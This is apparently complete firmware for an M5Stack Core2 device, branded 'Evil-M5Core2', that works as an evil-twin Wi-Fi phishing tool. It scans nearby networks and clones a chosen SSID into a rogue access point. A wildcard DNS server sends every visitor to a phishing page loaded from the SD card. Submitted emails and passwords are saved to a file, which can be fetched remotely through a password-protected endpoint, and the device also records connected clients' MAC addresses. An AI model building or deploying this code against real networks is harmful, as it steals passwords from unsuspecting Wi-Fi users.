#include <M5Unified.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
extern "C" {
  #include "esp_wifi.h"
  #include "esp_system.h"
}



static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;
const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials", "Monitor Status" };
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
String ssidList[100];
int numSsid = 0;
bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "";  

// Connect to wifi CHANGE THIS !!!!! 
const char* ssid = "WifiSSID"; // ssid to connect 
const char* password = "WifiCore2Test"; // wifi password
const char* accessWebPassword = "7h30th3r0n3"; //password for web access to remote check captured credentials


String portalFiles[20]; // 20 portals max 
int numPortalFiles = 0;
String selectedPortalFile = "/sites/normal.html"; // defaut portal
int portalFileIndex = 0; 



int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;
bool isCaptivePortalOn = false;


String macAddresses[10]; // 10 mac address max
int numConnectedMACs = 0; 



void setup() {
  M5.begin();

  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setTextFont(1);

  const char* startUpMessages[] = {
    "Welcome Back!",
    "Hack the Planet!",
    "Accessing Mainframe...",
    "Cracking Codes...",
    "Decrypting Messages...",
    "Infiltrating the Network...",
    "Bypassing Firewalls...",
    "Exploring the Deep Web...",
    "Launching Cyber Attack...",
    "Running Stealth Mode...",
    "Gathering Intel...",
    "Shara Conord?",
    "Breaking Encryption...",
    "Anonymous Mode Activated.",
    "Cybersecurity Breach Detected.",
    "Initiating Protocol 47...",
    "The Gibson is in Sight.",
    "Running the Matrix...",
    "Neural Networks Syncing...",
    "Quantum Algorithms at Work...",
    "Digital Footprint Erased.",
    "Uploading Virus...",
    "Downloading Data...",
    "Root Access Granted.",
    "Cyberpunk Mode: Engaged.",
    "Zero Days Exploited.",
    "Retro Hacking Activated.",
    "Firewall: Deactivated."
  };
  const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);

  randomSeed(esp_random());

  int randomIndex = random(numMessages);
  const char* randomMessage = startUpMessages[randomIndex];


  int textY = 80;
  int lineOffset = 10;
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30; 

  M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
  M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);

  M5.Display.setCursor(85, textY);
  M5.Display.println(" Evil-M5Core2");
  Serial.println("---------------------");  
  Serial.println(" Evil-M5Core2");
  M5.Display.setCursor(80, textY + 20);
  M5.Display.println("By 7h30th3r0n3");
  Serial.println("By 7h30th3r0n3");
  Serial.println("---------------------"); 
  M5.Display.setCursor(10, textY + 120);
  M5.Display.println(randomMessage);
  Serial.println(" ");
  Serial.println(randomMessage);
  Serial.println("---------------------"); 
  firstScanWifiNetworks();

  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.begin(ssid, password);
  
unsigned long startAttemptTime = millis();
while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
    delay(500);
    Serial.println("Trying to connect to Wifi..." );
}

if (WiFi.status() == WL_CONNECTED) {
    Serial.println("Connected to wifi !!!");
} else {
    Serial.println("Fail to connect to Wifi or timeout...");
}
  
  if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
    Serial.println("Error.. SD card not mounted...");
    return;
  }
  Serial.println("SD card initialized !! ");


xTaskCreate(
        backgroundTask, 
        "BackgroundTask", 
        100000, /*stack*/
        NULL, 
        1, 
        NULL);
        
}

void backgroundTask(void *pvParameters) {
    for (;;) {
        dnsServer.processNextRequest();
        server.handleClient();
        vTaskDelay(100); 
    }
}

void firstScanWifiNetworks() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    unsigned long startTime = millis();
    int n;
    while (millis() - startTime < 2000) {
        n = WiFi.scanNetworks();
        if (n != WIFI_SCAN_RUNNING) break;
    }

    if (n == 0) {
        Serial.println("No network found ...");
    } else {
        Serial.print(n);
        Serial.println(" Near Wifi Networks : ");
        Serial.println("-------------------------");
        numSsid = min(n, 100);
        for (int i = 0; i < numSsid; i++) {
            ssidList[i] = WiFi.SSID(i);
            Serial.println(ssidList[i]);
        }
        Serial.println("-------------------------");
    }
}

void loop() {
  M5.update();

  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    if (M5.BtnB.wasPressed()) {
      inMenu = true;
      isOperationInProgress = false;
    }
  }
  //dnsServer.processNextRequest();
  //server.handleClient();
}

void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
    case 0:
      scanWifiNetworks();
      break;
    case 1:
      showWifiList();
      break;
    case 2:
      showWifiDetails(currentListIndex); 
      break;
    case 3:
      createCaptivePortal();
      break;
    case 4:
      stopCaptivePortal();
      break;
    case 5:
      changePortal();
      break;
    case 6:
      checkCredentials();
      break;
    case 7:
      deleteCredentials();
      break;
    case 8: 
      displayMonitorPage1();
      break;
  }
  isOperationInProgress = false;
}


void handleMenuInput() {
  if (M5.BtnA.wasPressed()) {
    currentIndex--;
    if (currentIndex < 0) {
      currentIndex = menuSize - 1; 
    }
  } else if (M5.BtnC.wasPressed()) {
    currentIndex++;
    if (currentIndex >= menuSize) {
      currentIndex = 0;  
    }
  } else if (M5.BtnB.wasPressed()) {
    executeMenuItem(currentIndex);
  }
}

void drawMenu() {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextFont(1);

    int lineHeight = 24; 
    int startX = 10;
    int startY = 25;

    for (int i = 0; i < menuSize; i++) {
        if (i == currentIndex) {
            M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
        M5.Display.println(menuItems[i]);
    }
    M5.Display.display();
}


void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
    M5.Display.setCursor(50 , M5.Display.height()/ 2 );
    M5.Display.print("Scan in progress... ");
    M5.Display.display();
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  numSsid = min(n, 100);
  for (int i = 0; i < numSsid; i++) {
    ssidList[i] = WiFi.SSID(i);
  }
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.begin(ssid, password);
  waitAndReturnToMenu("Scan Completed");
}


void showWifiList() {
  const int listDisplayLimit = M5.Display.height() / 18; 
  int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
  
  M5.Display.clear();
  M5.Display.setTextSize(2);
  for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
    if (i == currentListIndex) {
      M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(10, 25 + (i - listStartIndex) * 18);
    M5.Display.println(ssidList[i]);
  }
  M5.Display.display();

while (!inMenu) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      currentListIndex--;
      if (currentListIndex < 0) {
        currentListIndex = numSsid - 1; 
      }
      showWifiList();
    } else if (M5.BtnC.wasPressed()) {
      currentListIndex++;
      if (currentListIndex >= numSsid) {
        currentListIndex = 0; 
      }
      showWifiList(); 
    } else if (M5.BtnB.wasPressed()) {
      inMenu = true;
      waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
    }
  }
}

void showWifiDetails(int networkIndex) {
  if (networkIndex >= 0 && networkIndex < numSsid) {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    int y = 10; 

    // Afficher le SSID
    M5.Display.setCursor(10, y);
    M5.Display.println("SSID: " + ssidList[networkIndex]);
    y += 40;
    
    M5.Display.setCursor(10, y);
    M5.Display.println("Channel: " + String(WiFi.channel(networkIndex)));
    y += 20;
    
    M5.Display.setCursor(10, y);
    String security = getWifiSecurity(networkIndex);
    M5.Display.println("Security: " + security);
    y += 20;

    M5.Display.setCursor(10, y);
    int32_t rssi = WiFi.RSSI(networkIndex);
    M5.Display.println("Signal: " + String(rssi) + " dBm");
    y += 20;

    M5.Display.setCursor(10, y);
    uint8_t* bssid = WiFi.BSSID(networkIndex);
    String macAddress = bssidToString(bssid);
    M5.Display.println("MAC: " + macAddress);
    y += 20;
    
    M5.Display.setCursor(230, 220);
    M5.Display.println("Clone");
    M5.Display.setCursor(140, 220);
    M5.Display.println("Back");
    
    M5.Display.display();

    while (!inMenu) {
      M5.update();
      if (M5.BtnC.wasPressed()) {
        cloneSSIDForCaptivePortal(ssidList[networkIndex]);
        inMenu = true;
        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
        drawMenu(); 
      } else if (M5.BtnB.wasPressed()) {
        inMenu = true;
        drawMenu(); 

      }
    }
  }
}

String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

void createCaptivePortal() {
    String ssid = clonedSSID.isEmpty() ? "FreeWifi" : clonedSSID;
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP(clonedSSID.c_str());
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    isCaptivePortalOn = true;

    server.on("/", HTTP_GET, []() {
        String email = server.arg("email");
        String password = server.arg("password");
        if (!email.isEmpty() && !password.isEmpty()) {
            saveCredentials(email, password);
            server.send(200, "text/plain", "Credentials Saved");
        } else {
            servePortalFile(selectedPortalFile);
        }
    });
    
    server.on("/credentials", HTTP_GET, []() {
        String password = server.arg("pass");
        if (password == accessWebPassword) {
            File file = SD.open("/credentials.txt");
            if (file) {
                server.streamFile(file, "text/plain");
                file.close();
            } else {
                server.send(404, "text/plain", "File not found");
            }
        } else {
            server.send(403, "text/plain", "Unauthorized");
        }
    });
    server.onNotFound([]() {
        servePortalFile(selectedPortalFile);
    });

    server.begin();
    waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
}

void servePortalFile(const String& filename) {
    File webFile = SD.open(filename);
    if (webFile) {
        server.streamFile(webFile, "text/html");
        webFile.close();
    } else {
        server.send(404, "text/plain", "File not found");
    }
}

void saveCredentials(const String& email, const String& password) {
    File file = SD.open("/credentials.txt", FILE_APPEND);
    if (file) {
        file.println("Email:" + email);
        file.println("Password:" + password);
        file.println("----------------------");
        file.close();
        Serial.println("Credentials " + email + ":" + password + " saved");
    } else {
        Serial.println("Error opening file for writing");
    }
}
void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  waitAndReturnToMenu("  Portal Stopped");
}


void listPortalFiles() {
    File root = SD.open("/sites");
    numPortalFiles = 0;
    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            portalFiles[numPortalFiles++] = String("/sites/") + file.name();
            if (numPortalFiles >= 10) break;
        }
        file.close();
    }
    root.close();
}

void changePortal() {
    listPortalFiles();
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(10, 10);
    M5.Display.println("Select Portal:");
    
    for (int i = 0; i < numPortalFiles; i++) {
        M5.Display.setCursor(10, 30 + i * 20);
        if (i == portalFileIndex) {
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.println(portalFiles[i].substring(7)); 
    }
    M5.Display.display();
    
    while (!inMenu) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            portalFileIndex = max(0, portalFileIndex - 1);
            changePortal();
        } else if (M5.BtnC.wasPressed()) {
            portalFileIndex = min(numPortalFiles - 1, portalFileIndex + 1);
            changePortal();
        } else if (M5.BtnB.wasPressed()) {
            selectedPortalFile = portalFiles[portalFileIndex];
            inMenu = true;
            waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected"); 
        }
    }
}


String credentialsList[100]; // max 100 lignes parsed
int numCredentials = 0; 

void readCredentialsFromFile() {
    File file = SD.open("/credentials.txt");
    if (file) {
        numCredentials = 0;
        while (file.available() && numCredentials < 100) {
            credentialsList[numCredentials++] = file.readStringUntil('\n');
        }
        file.close();
    } else {
        Serial.println("Error opening file");
    }
}

void checkCredentials() {
    readCredentialsFromFile();
    if (numCredentials == 0) {
        waitAndReturnToMenu(" No credentials...");
    } else {
        const int lineHeight = 18; 
        const int maxLineLength = M5.Display.width() / 13; 
        const int listDisplayLimit = M5.Display.height() / lineHeight - 2; // -2 pour tenir compte du décalage initial de 25 pixels

        int totalLines = 0;
        int listStartIndex = 0;
        // Trouver l'index de départ et le nombre total de lignes
        for (int i = 0; i < numCredentials; i++) {
            int linesNeeded = (credentialsList[i].length() + maxLineLength - 1) / maxLineLength;
            if (i < currentListIndex) {
                listStartIndex += linesNeeded;
            }
            totalLines += linesNeeded;
        }

        int listEndIndex = min(totalLines, listStartIndex + listDisplayLimit);
        M5.Display.clear();
        M5.Display.setTextSize(2);

        int displayY = 25;
        int currentLine = 0;
        for (int i = 0; i < numCredentials; i++) {
            String credential = credentialsList[i];
            int credentialLength = credential.length();
            int linesNeeded = (credentialLength + maxLineLength - 1) / maxLineLength;

            for (int line = 0; line < linesNeeded; line++) {
                if (currentLine >= listStartIndex && currentLine < listEndIndex) {
                    int startIndex = line * maxLineLength;
                    int endIndex = min(startIndex + maxLineLength, credentialLength);
                    String part = credential.substring(startIndex, endIndex);

                    if (i == currentListIndex) {
                        M5.Display.fillRect(0, displayY, M5.Display.width(), lineHeight, TFT_NAVY);
                        M5.Display.setTextColor(TFT_GREEN);
                    } else {
                        M5.Display.setTextColor(TFT_WHITE);
                    }

                    M5.Display.setCursor(10, displayY);
                    M5.Display.println(part);
                    displayY += lineHeight;
                }
                currentLine++;
            }
            if (currentLine >= listEndIndex) break;
        }
        M5.Display.display();

        while (!inMenu) {
            M5.update();
            if (M5.BtnA.wasPressed()) {
                currentListIndex = max(0, currentListIndex - 1);
                checkCredentials();
            } else if (M5.BtnC.wasPressed()) {
                currentListIndex = min(numCredentials - 1, currentListIndex + 1);
                checkCredentials();
            } else if (M5.BtnB.wasPressed()) {
                inMenu = true;
                drawMenu(); 
            }
        }
    }
}



bool confirmDeletePopup() {
  bool confirm = false;
  bool decisionMade = false;
  
  M5.Display.clear();
  M5.Display.setCursor(50, M5.Display.height()/2);
  M5.Display.println("Delete credentials?");
  M5.Display.setCursor(37, 220);
  M5.Display.println("Yes");
  M5.Display.setCursor(254, 220);
  M5.Display.println("No");

  while (!decisionMade) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      confirm = true;
      decisionMade = true;
    }
    if (M5.BtnC.wasPressed()) {
      confirm = false;
      decisionMade = true;
    }
  }

  return confirm;
}

void deleteCredentials() {
    if (confirmDeletePopup()) {
        File file = SD.open("/credentials.txt", FILE_WRITE);
        if (file) {
            file.close();
            waitAndReturnToMenu("Deleted successfully");
            Serial.println("Credentials deleted successfully");
        } else {
            waitAndReturnToMenu("Error..");
            Serial.println("Error opening file for deletion");
        }
    } else {
        waitAndReturnToMenu("Deletion cancelled");
    }
}


int countPasswordsInFile() {
    File file = SD.open("/credentials.txt");
    if (!file) {
        Serial.println("Error opening credentials file for reading");
        return 0;
    }

    int passwordCount = 0;
    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.startsWith("Password:")) {
            passwordCount++;
        }
    }

    file.close();
    return passwordCount;
}

void displayMonitorPage1() {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(10, 30);
    M5.Display.println("Clients : " + String(WiFi.softAPgetStationNum()));
    M5.Display.setCursor(10, 60);
    M5.Display.println("Passwords: " + String(countPasswordsInFile()));
    M5.Display.setCursor(10, 90);
    M5.Display.println("Cloned: " + clonedSSID);
    M5.Display.setCursor(10, 120);
    M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
    M5.Display.setCursor(10, 150);
    M5.Display.println("Page: " + selectedPortalFile.substring(7));
    M5.Display.display();

    while (!inMenu) {
        M5.update();

        if (M5.BtnA.wasPressed()) {
            displayMonitorPage3();
            break;
        } else if (M5.BtnC.wasPressed()) {
            displayMonitorPage2();
            break;
        } else if (M5.BtnB.wasPressed()) {
            inMenu = true; 
            drawMenu();
            break;
        }
    }
}

void updateConnectedMACs() {
    wifi_sta_list_t stationList;
    tcpip_adapter_sta_list_t adapterList;
    esp_wifi_ap_get_sta_list(&stationList);
    tcpip_adapter_get_sta_list(&stationList, &adapterList);

    for (int i = 0; i < adapterList.num; i++) {
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
                 adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
        macAddresses[i] = String(macStr);
    }
}

void displayMonitorPage2() {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    updateConnectedMACs();

    for (int i = 0; i < 10; i++) {
        int y = 30 + i * 20; // Calculer la position Y pour chaque adresse MAC
        if (y > M5.Display.height() - 20) break; // S'assurer de ne pas déborder de l'écran

        M5.Display.setCursor(10, y);
        M5.Display.println(macAddresses[i]);
    }

    M5.Display.display();

    while (!inMenu) {
        M5.update();

        if (M5.BtnA.wasPressed()) {
            displayMonitorPage1(); 
            break;
        } else if (M5.BtnC.wasPressed()) {
            displayMonitorPage3(); 
            break;
        } else if (M5.BtnB.wasPressed()) {
            inMenu = true; 
            drawMenu();
            break;
        }
    }
    }

void displayMonitorPage3() {
    M5.Display.clear();
    M5.Display.setTextSize(2);

    M5.Display.setCursor(10, 30);
    M5.Display.println("CPU: " + String(getCpuUsage()) + "%");

    M5.Display.setCursor(10, 60);
    M5.Display.println("RAM: " + String(getRamUsage()) + " Mo");

    M5.Display.setCursor(10, 90);
    M5.Display.println("Batterie: " + String(getBatteryLevel()) + "%");

    M5.Display.setCursor(10, 120);
    M5.Display.println("Temperature: " + String(getTemperature()) + " C");

    M5.Display.display();

    while (!inMenu) {
        M5.update();

        if (M5.BtnA.wasPressed()) {
            displayMonitorPage2();
            break;
        } else if (M5.BtnC.wasPressed()) {
            displayMonitorPage1(); 
            break;
        } else if (M5.BtnB.wasPressed()) {
            inMenu = true; 
            drawMenu();
            break;
        }
    }
}

String getBatteryLevel() {
    return String(M5.Power.getBatteryLevel());
}

String getTemperature() {
    float temperature;
    M5.Imu.getTemp(&temperature);
    return String(temperature);
}
String getCpuUsage() {
    
        // todo
    return "N/A";
}

String getRamUsage() {
    float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0; 
    char buffer[10]; 
    sprintf(buffer, "%.2f", heapSizeInMegabytes);
    return String(buffer);
}


void waitAndReturnToMenu(String message) {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
  M5.Display.setCursor(50 , M5.Display.height()/ 2 );
  M5.Display.println(message);
  M5.Display.display();
  delay(1000);
  inMenu = true;
  drawMenu();  
}
